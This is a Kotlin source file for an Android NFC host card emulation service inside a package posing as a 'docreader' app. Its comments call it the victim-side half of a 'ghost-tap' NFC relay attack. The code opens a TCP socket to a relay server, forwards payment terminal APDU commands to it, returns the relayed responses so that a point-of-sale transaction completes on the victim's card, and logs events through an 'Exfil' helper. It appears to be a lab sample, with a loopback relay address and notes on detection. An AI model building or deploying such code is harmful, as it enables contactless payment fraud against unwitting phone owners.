package com.docreader.lite.reader.advanced

import android.nfc.cardemulation.HostApduService
import android.os.Bundle
import com.docreader.lite.reader.Exfil
import kotlinx.coroutines.*
import java.io.DataInputStream
import java.io.DataOutputStream
import java.net.Socket

/**
 * NFC relay / ghost-tap — RatOn pattern (2025).
 *
 * Attacker holds phone near POS terminal → POS sends NFC commands →
 * commands relayed over internet to victim's phone → victim's phone
 * responds using their tokenized card → response relayed back →
 * POS completes transaction using victim's payment method.
 *
 * Architecture:
 *   POS Terminal ←NFC→ [Attacker Phone (Reader)]
 *                          ↕ TCP relay
 *                       [Victim Phone (HCE Emulator)]
 *                          ↕ NFC
 *                       [Victim's Secure Element / HCE]
 *
 * This file: the VICTIM-SIDE HCE relay (HostApduService).
 * Receives APDU commands from relay server, forwards to local NFC stack,
 * returns responses to relay server.
 *
 * The attacker-side reader is a separate app (not included — different device).
 *
 * Detection: HCE service binding + unusual APDU patterns +
 * network activity during NFC transaction.
 */
class NfcTagService : HostApduService() {

    companion object {
        private const val RELAY_HOST = "10.0.2.2" // Lab: emulator loopback
        private const val RELAY_PORT = 9999

        // SELECT AID for payment (ISO 7816-4)
        private val SELECT_PPSE = byteArrayOf(
            0x00, 0xA4.toByte(), 0x04, 0x00, 0x0E,
            0x32, 0x50, 0x41, 0x59, 0x2E, 0x53, 0x59, 0x53,
            0x2E, 0x44, 0x44, 0x46, 0x30, 0x31, 0x00
        ) // "2PAY.SYS.DDF01" (Proximity Payment System Environment)
    }

    private var relaySocket: Socket? = null
    private var relayInput: DataInputStream? = null
    private var relayOutput: DataOutputStream? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        connectToRelay()
    }

    /**
     * processCommandApdu — called when POS terminal sends APDU.
     *
     * In relay mode:
     *   1. Receive APDU from Android NFC stack (from POS via attacker relay)
     *   2. Forward to relay server
     *   3. Relay server forwards to victim's actual card
     *   4. Receive response from relay server
     *   5. Return response to Android NFC stack → POS terminal
     */
    override fun processCommandApdu(commandApdu: ByteArray, extras: Bundle?): ByteArray {
        Exfil.event("nfc_apdu_received",
            "length" to commandApdu.size.toString(),
            "header" to commandApdu.take(4).joinToString("") { "%02X".format(it) }
        )

        // Forward APDU to relay server and get response
        val response = relayApdu(commandApdu)

        if (response != null) {
            Exfil.event("nfc_apdu_relayed",
                "cmd_len" to commandApdu.size.toString(),
                "resp_len" to response.size.toString()
            )
            return response
        }

        // Relay failed — return error status word
        return byteArrayOf(0x6F.toByte(), 0x00) // SW_UNKNOWN
    }

    override fun onDeactivated(reason: Int) {
        Exfil.event("nfc_deactivated", "reason" to reason.toString())
        disconnectRelay()
    }

    // ─── Relay communication ───────────────────────────────────────────

    private fun connectToRelay() {
        scope.launch {
            try {
                relaySocket = Socket(RELAY_HOST, RELAY_PORT)
                relayInput = DataInputStream(relaySocket!!.getInputStream())
                relayOutput = DataOutputStream(relaySocket!!.getOutputStream())

                Exfil.event("nfc_relay_connected",
                    "host" to RELAY_HOST,
                    "port" to RELAY_PORT.toString()
                )
            } catch (_: Exception) {
                Exfil.event("nfc_relay_connect_failed",
                    "host" to RELAY_HOST,
                    "port" to RELAY_PORT.toString()
                )
            }
        }
    }

    private fun disconnectRelay() {
        try {
            relaySocket?.close()
            relaySocket = null
            relayInput = null
            relayOutput = null
        } catch (_: Exception) {}
    }

    /**
     * Forward APDU to relay server, receive response.
     * Protocol:
     *   [2 bytes: length][N bytes: APDU data]
     *   Response same format.
     */
    private fun relayApdu(apdu: ByteArray): ByteArray? {
        return try {
            val output = relayOutput ?: return null
            val input = relayInput ?: return null

            // Send: length + data
            output.writeShort(apdu.size)
            output.write(apdu)
            output.flush()

            // Receive: length + data
            val respLen = input.readUnsignedShort()
            val response = ByteArray(respLen)
            input.readFully(response)

            response
        } catch (_: Exception) {
            null
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        disconnectRelay()
        scope.cancel()
    }
}
